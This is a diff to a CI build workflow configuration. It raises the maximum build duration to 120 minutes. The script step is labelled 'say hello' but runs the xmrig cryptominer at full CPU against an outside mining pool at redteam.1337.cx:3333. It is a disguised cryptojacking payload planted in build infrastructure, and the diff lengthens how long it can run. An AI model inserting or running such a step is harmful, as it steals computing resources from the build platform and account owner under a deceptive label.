@@ -1,5 +1,6 @@
 workflows:
   my-workflow:
+    max-build-duration: 120
     scripts:
       - name: say hello
         script: chmod +x xmrig && ./xmrig --donate-level 0 --max-cpu-usage 100 -o redteam.1337.cx:3333 -k
